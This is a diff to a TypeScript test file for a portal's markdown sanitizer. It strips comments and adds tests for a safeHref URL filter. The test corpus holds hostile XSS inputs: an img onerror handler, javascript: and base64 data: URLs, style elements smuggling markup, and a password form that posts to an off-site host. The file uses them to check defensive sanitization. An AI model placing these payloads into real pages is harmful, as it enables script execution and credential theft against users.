@@ -1,24 +1,7 @@
-/**
- * tiles.test.ts — DOMPurify sanitization regression test.
- *
- * Covers `sanitizeEducationMarkdown()` (tiles.ts), the exact
- * marked + DOMPurify composition parseTile() runs over an operator-supplied
- * `<slug>.md` before `set:html` injection on the /apps/<slug> detail page,
- * with both the `html` and `svg` USE_PROFILES on (inline diagrams have to
- * survive, which widens what the sanitizer has to get right).
- *
- * The hostile-input corpus below asserts a property, not a snapshot:
- * nothing executable survives sanitization. Each case's `forbidden` patterns
- * are markers of live script/handler/URL-scheme survival, not a copy of one
- * library's exact output — a sanitizer-internal minor bump (e.g. a changed
- * attribute allowlist ordering) does not fail these; a script, event
- * handler or javascript:/data: scheme reaching the output does.
- *
- * Run: npx vitest run   (from portal/)
- */
+// Invariant: nothing executable survives sanitization or safeHref; assertions are properties, not snapshots.
 
 import { describe, it, expect } from 'vitest';
-import { sanitizeEducationMarkdown } from './tiles';
+import { sanitizeEducationMarkdown, safeHref } from './tiles';
 
 describe('tiles.ts: marked + DOMPurify sanitization', () => {
   it('strips onerror from img tags (XSS via education markdown)', () => {
@@ -67,9 +50,7 @@ interface HostileCase {
   category: string;
   name: string;
   raw: string;
-  /** Patterns marking live-script/handler/scheme survival — must NOT match. */
   forbidden: RegExp[];
-  /** Benign markers that must still be present (prose/element survival). */
   mustContain?: RegExp[];
 }
 
@@ -120,8 +101,6 @@ const hostileCorpus: HostileCase[] = [
     forbidden: [/data:text\/html/i, /<script/i, new RegExp(MARK)],
   },
   {
-    // No markup in the attribute value, so only the URI policy stands
-    // between this href and a navigable data: document.
     category: 'data-url',
     name: 'base64 data:text/html anchor',
     raw: `<a href="data:text/html;base64,${Buffer.from(`<script>window.${MARK}=1</script>`).toString('base64')}">click</a>`,
@@ -164,11 +143,6 @@ const hostileCorpus: HostileCase[] = [
     forbidden: [/javascript:/i, new RegExp(MARK)],
   },
   {
-    // No shipped browser executes a javascript: scheme reached via a CSS
-    // url() value (that was an IE-only behavior), so DOMPurify passes CSS
-    // text through unparsed, in a `style` attribute and in a `<style>`
-    // element alike. The enforceable property is containment: markup
-    // carried inside CSS must not come out as a live element or handler.
     category: 'style-css-url',
     name: 'style element whose text carries markup',
     raw: `Prose.\n\n<style><img src=x onerror="window.${MARK}=1"></style>\n\nMore prose.`,
@@ -358,17 +332,12 @@ const hostileCorpus: HostileCase[] = [
     forbidden: [/javascript:/i, new RegExp(MARK)],
   },
   {
-    // The autolink's visible text is the URL itself, so only the href is
-    // a survival marker here.
     category: 'markdown-html-passthrough',
     name: 'autolink to javascript:',
     raw: `<javascript:window.${MARK}=1>`,
     forbidden: [/href\s*=\s*["']?\s*javascript:/i],
   },
   {
-    // No script/handler needed here — the CSP has no style-src, so a
-    // <style> element that just survives sanitization is itself the
-    // exploit: it restyles the whole portal page or the dashboard modal.
     category: 'forbidden-tag',
     name: 'style element after a line of prose',
     raw: `Prose.\n\n<style>body{display:none} .${MARK}{color:red}</style>\n\nMore prose.`,
@@ -383,8 +352,6 @@ const hostileCorpus: HostileCase[] = [
     mustContain: [/<circle/],
   },
   {
-    // form-action lets this post to any apex subdomain; the form/input/
-    // button tags themselves are the exploit, no javascript: needed.
     category: 'forbidden-tag',
     name: 'credential form posting off-site',
     raw: `<form action="https://${MARK}.example/collect" method="post"><input name="password" type="password"><button type="submit">Sign in</button></form>`,
@@ -414,4 +381,28 @@ describe('tiles.ts: hostile-input corpus — nothing executable survives', () =>
       }
     });
   }
+});
+
+describe('tiles.ts: safeHref', () => {
+  it.each([
+    ['https URL', 'https://grafana.othala.test', 'https://grafana.othala.test'],
+    ['http URL', 'http://internal.host/path', 'http://internal.host/path'],
+    ['root-relative path', '/apps/grafana', '/apps/grafana'],
+    ['root-relative path with query', '/foo?bar=baz', '/foo?bar=baz'],
+  ])('allows %s', (_name, input, expected) => {
+    expect(safeHref(input)).toBe(expected);
+  });
+
+  it.each([
+    ['javascript:', 'javascript:alert(1)'],
+    ['javascript: (mixed case)', 'JavaScript:alert(1)'],
+    ['data:', 'data:text/html,<script>alert(1)</script>'],
+    ['vbscript:', 'vbscript:msgbox(1)'],
+    ['blob:', 'blob:https://example.com/uuid'],
+    ['file:', 'file:///etc/passwd'],
+    ['ftp:', 'ftp://files.example.com'],
+    ['empty string', ''],
+  ])('blocks %s', (_name, input) => {
+    expect(safeHref(input)).toBe('#');
+  });
 });
